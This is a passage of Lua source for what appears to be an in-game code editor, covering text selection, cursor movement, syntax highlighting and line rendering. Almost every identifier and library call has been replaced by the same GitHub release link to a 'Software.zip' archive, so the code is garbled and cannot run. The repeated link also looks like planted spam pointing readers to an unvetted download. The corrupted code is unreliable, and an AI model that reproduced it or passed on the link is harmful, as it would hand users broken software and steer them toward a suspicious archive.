							if endCursorX > #line then
								endCursorY = endCursorY + 1
								endCursorX = 0
							end
							self:UpdateCursor()

							endRange = endRange or {endCursorX,endCursorY}
						end

						self:DeleteRange({startRange,endRange},false,true)
						self:ResetSelection(true)
						self:JumpToCursor()
					end)
				elseif https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) then
					if keycode == keycodes.A then
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {{0,0},{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip],https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip}}
						self:SetCopyableSelection()
						self:Refresh()
					end
				end
			end)
		end
		
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			end
		end
		
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,norefresh)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {{-1,-1},{-1,-1}}
			if not norefresh then self:Refresh() end
		end
		
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,range)
			local selectionRange = range or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local selX,selY = selectionRange[1][1], selectionRange[1][2]
			local sel2X,sel2Y = selectionRange[2][1], selectionRange[2][2]

			if selX == -1 or (selX == sel2X and selY == sel2Y) then return false end

			return true
		end
		
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,range,noprocess,updatemouse)
			range = range or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			if not self:IsValidRange(range) then return end
			
			local lines = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local selX,selY = range[1][1], range[1][2]
			local sel2X,sel2Y = range[2][1], range[2][2]
			local deltaLines = sel2Y-selY
			
			if not lines[selY+1] or not lines[sel2Y+1] then return end
			
			local leftSub = lines[selY+1]:sub(1,selX)
			local rightSub = lines[sel2Y+1]:sub(sel2X+1)
			lines[selY+1] = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			
			local remove = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			for i = 1,deltaLines do
				remove(lines,selY+2)
			end
			
			if range == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {{-1,-1},{-1,-1}} end
			if updatemouse then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = selX
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = selY
				self:UpdateCursor()
			end
			
			if not noprocess then
				self:ProcessTextChange()
			end
		end
		
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,text)
			self:DeleteRange(nil,true,true)
			local lines,cursorX,cursorY = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local line = lines[cursorY+1]
			local before = line:sub(1,cursorX)
			local after = line:sub(cursorX+1)
			
			text = text:gsub("\r\n","\n")
			text = self:ConvertText(text,true) -- Tab Convert
			
			local textLines = text:split("\n")
			local insert = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			
			for i = 1,#textLines do
				local linePos = cursorY+i
				if i > 1 then insert(lines,linePos,"") end
				
				local textLine = textLines[i]
				local newBefore = (i == 1 and before or "")
				local newAfter = (i == #textLines and after or "")
			
				lines[linePos] = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			end
			
			if #textLines > 1 then cursorX = 0 end
			
			self:ProcessTextChange()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = cursorX + #textLines[#textLines]
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = cursorY + #textLines-1
			self:UpdateCursor()
		end
		
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,x,y)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + y)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + x)
		end
		
		-- x and y starts at 0
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,x,y)
			local lines = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local line = lines[y+1]
			x=x+1
			
			if line then
				local left = line:sub(x-1,x-1)
				local middle = line:sub(x,x)
				local right = line:sub(x+1,x+1)
				local selRange = (#left > 0 and left or " ") .. (#middle > 0 and middle or " ") .. (#right > 0 and right or " ")

				for i,v in pairs(tabJumps) do
					if selRange:find(i) then
						return v
					end
				end
			end
			return 0
		end
		
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,on,input)			
			self:UpdateCursor(input)
			
			if on then
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = ""
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
				end
			else
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			end
		end
		
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,on)
			local cursor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local animTime = tick()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = animTime
			
			if not on then return end
			
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
			
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
				while https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip do
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.5)
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= animTime then return end
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.4)
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= animTime then return end
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.2)
				end
			end)()
		end
		
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,x,y)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = x
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = y
			self:UpdateCursor()
			self:JumpToCursor()
		end
		
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			self:Refresh()
		end
		
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,input)
			local linesFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local cursor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip			
			local hSize = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
			local vSize = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
			local maxLines = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(vSize / https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
			local maxCols = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(hSize / https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip))
			local viewX,viewY = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local totalLinesStr = tostring(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
			local fontWidth = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip / 2)
			local linesOffset = #totalLinesStr*fontWidth + 4*fontWidth
			
			if input then
				local linesFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				local frameX,frameY = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				local mouseX,mouseY = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				local fontSizeX,fontSizeY = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip((mouseX - frameX) / fontSizeX)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip((mouseY - frameY) / fontSizeY)
			end
			
			local cursorX,cursorY = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			
			local line = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[cursorY+1] or ""
			if cursorX > #line then cursorX = #line
			elseif cursorX < 0 then cursorX = 0 end
			
			if cursorY >= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				cursorY = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
			elseif cursorY < 0 then
				cursorY = 0
			end
			
			cursorX = cursorX + self:TabAdjust(cursorX,cursorY)
			
			-- Update modified
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = cursorX
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = cursorY
			
			local cursorVisible = (cursorX >= viewX) and (cursorY >= viewY) and (cursorX <= viewX + maxCols) and (cursorY <= viewY + maxLines)
			if cursorVisible then
				local offX = (cursorX - viewX)
				local offY = (cursorY - viewY)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,linesOffset + offX*https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) - 1,0,offY*https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip+2)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
				self:CursorAnim(true)
			else
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			end
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			local newLines = {}
			local count = 1
			local text = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local find = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local init = 1

			local pos = find(text,"\n",init,true)
			while pos do
				newLines[count] = pos
				count = count + 1
				init = pos + 1
				pos = find(text,"\n",init,true)
			end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = newLines
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			local start = tick()
			local text = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("\\\\","  ")
			--print("BACKSLASH SUB",tick()-start)
			local textLen = #text
			local found = {}
			local foundMap = {}
			local extras = {}
			local find = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local sub = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {}

			local function findAll(str,pattern,typ,raw)
				local count = #found+1
				local init = 1
				local x,y,extra = find(str,pattern,init,raw)
				while x do
					found[count] = x
					foundMap[x] = typ
					if extra then
						extras[x] = extra
					end

					count = count+1
					init = y+1
					x,y,extra = find(str,pattern,init,raw)
				end
			end
			local start = tick()
			findAll(text,'"',1,true)
			findAll(text,"'",2,true)
			findAll(text,"%[(=*)%[",3)
			findAll(text,"--",4,true)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(found)

			local newLines = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local curLine = 0
			local lineTableCount = 1
			local lineStart = 0
			local lineEnd = 0
			local lastEnding = 0
			local foundHighlights = {}

			for i = 1,#found do
				local pos = found[i]
				if pos <= lastEnding then continue end

				local ending = pos
				local typ = foundMap[pos]
				if typ == 1 then
					ending = find(text,'"',pos+1,true)
					while ending and sub(text,ending-1,ending-1) == "\\" do
						ending = find(text,'"',ending+1,true)
					end
					if not ending then ending = textLen end
				elseif typ == 2 then
					ending = find(text,"'",pos+1,true)
					while ending and sub(text,ending-1,ending-1) == "\\" do
						ending = find(text,"'",ending+1,true)
					end
					if not ending then ending = textLen end
				elseif typ == 3 then
					_,ending = find(text,"]"https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[pos].."]",pos+1,true)
					if not ending then ending = textLen end
				elseif typ == 4 then
					local ahead = foundMap[pos+2]

					if ahead == 3 then
						_,ending = find(text,"]"https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[pos+2].."]",pos+1,true)
						if not ending then ending = textLen end
					else
						ending = find(text,"\n",pos+1,true) or textLen
					end
				end

				while pos > lineEnd do
					curLine = curLine + 1
					--lineTableCount = 1
					lineEnd = newLines[curLine] or textLen+1
				end
				while true do
					local lineTable = foundHighlights[curLine]
					if not lineTable then lineTable = {} foundHighlights[curLine] = lineTable end
					lineTable[pos] = {typ,ending}
					--lineTableCount = lineTableCount + 1

					if ending > lineEnd then
						curLine = curLine + 1
						lineEnd = newLines[curLine] or textLen+1
					else
						break
					end
				end

				lastEnding = ending
				--if i < 200 then print(curLine) end
			end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = foundHighlights
			--print(tick()-start)
			--print(#found,curLine)
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,line)
			local cached = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[line]
			if cached then return cached end

			local sub = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local find = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local match = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local highlights = {}
			local preHighlights = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[line] or {}
			local lineText = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[line] or ""
			local lineLen = #lineText
			local lastEnding = 0
			local currentType = 0
			local lastWord = nil
			local wordBeginsDotted = false
			local funcStatus = 0
			local lineStart = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[line-1] or 0

			local preHighlightMap = {}
			for pos,data in next,preHighlights do
				local relativePos = pos-lineStart
				if relativePos < 1 then
					currentType = data[1]
					lastEnding = data[2] - lineStart
					--warn(pos,data[2])
				else
					preHighlightMap[relativePos] = {data[1],data[2]-lineStart}
				end
			end

			for col = 1,#lineText do
				if col <= lastEnding then highlights[col] = currentType continue end

				local pre = preHighlightMap[col]
				if pre then
					currentType = pre[1]
					lastEnding = pre[2]
					highlights[col] = currentType
					wordBeginsDotted = false
					lastWord = nil
					funcStatus = 0
				else
					local char = sub(lineText,col,col)
					if find(char,"[%a_]") then
						local word = match(lineText,"[%a%d_]+",col)
						local wordType = (keywords[word] and 7) or (builtIns[word] and 8)

						lastEnding = col+#word-1

						if wordType ~= 7 then
							if wordBeginsDotted then
								local prevBuiltIn = lastWord and builtIns[lastWord]
								wordType = (prevBuiltIn and type(prevBuiltIn) == "table" and prevBuiltIn[word] and 8) or 10
							end

							if wordType ~= 8 then
								local x,y,br = find(lineText,"^%s*([%({\"'])",lastEnding+1)
								if x then
									wordType = (funcStatus > 0 and br == "(" and 16) or 9
									funcStatus = 0
								end
							end
						else
							wordType = specialKeywordsTypes[word] or wordType
							funcStatus = (word == "function" and 1 or 0)
						end

						lastWord = word
						wordBeginsDotted = false
						if funcStatus > 0 then funcStatus = 1 end

						if wordType then
							currentType = wordType
							highlights[col] = currentType
						else
							currentType = nil
						end
					elseif find(char,"%p") then
						local isDot = (char == ".")
						local isNum = isDot and find(sub(lineText,col+1,col+1),"%d")
						highlights[col] = (isNum and 6 or 5)

						if not isNum then
							local dotStr = isDot and match(lineText,"%.%.?%.?",col)
							if dotStr and #dotStr > 1 then
								currentType = 5
								lastEnding = col+#dotStr-1
								wordBeginsDotted = false
								lastWord = nil
								funcStatus = 0
							else
								if isDot then
									if wordBeginsDotted then
										lastWord = nil
									else
										wordBeginsDotted = true
									end
								else
									wordBeginsDotted = false
									lastWord = nil
								end

								funcStatus = ((isDot or char == ":") and funcStatus == 1 and 2) or 0
							end
						end
					elseif find(char,"%d") then
						local _,endPos = find(lineText,"%x+",col)
						local endPart = sub(lineText,endPos,endPos+1)
						if (endPart == "e+" or endPart == "e-") and find(sub(lineText,endPos+2,endPos+2),"%d") then
							endPos = endPos + 1
						end
						currentType = 6
						lastEnding = endPos
						highlights[col] = 6
						wordBeginsDotted = false
						lastWord = nil
						funcStatus = 0
					else
						highlights[col] = currentType
						local _,endPos = find(lineText,"%s+",col)
						if endPos then
							lastEnding = endPos
						end
					end
				end
			end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[line] = highlights
			return highlights
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			local start = tick()

			local linesFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local hSize = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
			local vSize = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
			local maxLines = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(vSize / https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
			local maxCols = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(hSize / https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip))
			local gsub = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local sub = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			local viewX,viewY = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			local lineNumberStr = ""

			for row = 1,maxLines do
				local lineFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[row]
				if not lineFrame then
					lineFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Frame")
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "Line"
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,(row-1)*https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1
					
					local selectionHighlight = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Frame")
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "SelectionHighlight"
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = lineFrame
					
					local label = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("TextLabel")
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "Label"
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 2
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = lineFrame
					
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = linesFrame
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[row] = lineFrame
				end

				local relaY = viewY + row
				local lineText = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[relaY] or ""
				local resText = ""
				local highlights = self:HighlightLine(relaY)
				local colStart = viewX + 1

				local richTemplates = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				local textTemplate = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				local selectionTemplate = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				local curType = highlights[colStart]
				local curTemplate = richTemplates[typeMap[curType]] or textTemplate
				
				-- Selection Highlight
				local selectionRange = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				local selPos1 = selectionRange[1]
				local selPos2 = selectionRange[2]
				local selRow,selColumn = selPos1[2],selPos1[1]
				local sel2Row,sel2Column = selPos2[2],selPos2[1]
				local selRelaX,selRelaY = viewX,relaY-1
				
				if selRelaY >= selPos1[2] and selRelaY <= selPos2[2] then
					local fontSizeX = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
					local posX = (selRelaY == selPos1[2] and selPos1[1] or 0) - viewX
					local sizeX = (selRelaY == selPos2[2] and selPos2[1]-posX-viewX or maxCols+viewX)

					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,posX*fontSizeX,0,0)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,sizeX*fontSizeX,1,0)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
				else
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
				end
				
				-- Selection Text Color for first char
				local inSelection = selRelaY >= selRow and selRelaY <= sel2Row and (selRelaY == selRow and viewX >= selColumn or selRelaY ~= selRow) and (selRelaY == sel2Row and viewX < sel2Column or selRelaY ~= sel2Row)
				if inSelection then
					curType = -999
					curTemplate = selectionTemplate
				end
				
				for col = 2,maxCols do
					local relaX = viewX + col
					local selRelaX = relaX-1
					local posType = highlights[relaX]
					
					-- Selection Text Color
					local inSelection = selRelaY >= selRow and selRelaY <= sel2Row and (selRelaY == selRow and selRelaX >= selColumn or selRelaY ~= selRow) and (selRelaY == sel2Row and selRelaX < sel2Column or selRelaY ~= sel2Row)
					if inSelection then
						posType = -999
					end
					
					if posType ~= curType then
						local template = (inSelection and selectionTemplate) or richTemplates[typeMap[posType]] or textTemplate
						
						if template ~= curTemplate then
							local nextText = gsub(sub(lineText,colStart,relaX-1),"['\"<>&]",richReplace)
							resText = resText .. (curTemplate ~= textTemplate and (curTemplate .. nextText .. "</font>") or nextText)
							colStart = relaX
							curTemplate = template
						end
						curType = posType
					end
				end

				local lastText = gsub(sub(lineText,colStart,viewX+maxCols),"['\"<>&]",richReplace)
				--warn("SUB",colStart,viewX+maxCols-1)
				if #lastText > 0 then
					resText = resText .. (curTemplate ~= textTemplate and (curTemplate .. lastText .. "</font>") or lastText)
				end

				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[relaY] then
					lineNumberStr = lineNumberStr .. (relaY == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and ("<b>"https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"</b>\n") or relaY .. "\n")
				end

				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = resText
			end

			for i = maxLines+1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip do
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[i]:Destroy()
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[i] = nil
			end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = lineNumberStr
			self:UpdateCursor()

			--print("REFRESH TIME",tick()-start)
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			local totalLinesStr = tostring(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
			local fontWidth = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip / 2)
			local linesOffset = #totalLinesStr*fontWidth + 4*fontWidth

			local linesFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local hSize = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local vSize = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local maxLines = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(vSize / https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
			local totalWidth = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip*fontWidth
			local scrollV = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local scrollH = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = maxLines
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + 1
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(hSize/fontWidth)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + 1

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + 1 > maxLines
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = totalWidth > hSize

			local oldOffsets = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and -16 or 0, https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and -16 or 0)
			if oldOffsets ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				self:UpdateView()
			else
				scrollV:ScrollTo(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,true)
				scrollH:ScrollTo(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,true)

				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,1,-16)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-16,0,16)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
				else
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,1,0)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,16)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
				end

				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,linesOffset,0,0)
